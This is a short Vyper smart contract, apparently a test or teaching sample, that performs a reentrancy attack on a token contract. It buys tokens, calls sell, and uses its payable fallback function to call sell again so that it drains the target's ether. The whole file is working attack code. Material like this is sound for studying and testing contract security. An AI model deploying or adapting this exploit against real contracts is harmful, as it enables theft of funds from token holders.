import token as Token

token_addr: address
token: Token

event Attack:
    pass

@external
def __init__():
    pass

@external
@payable
def __default__():
    # Try to extract more
    # but only once
    if self.token_addr.balance >= 10:
        log Attack()
        self.token.sell(10)

@external
@payable
def setup_account(token_addr: address):
    self.token = Token(token_addr)
    self.token_addr = token_addr
    self.token.buy(value=msg.value)

@external
def attack():
    self.token.sell(10)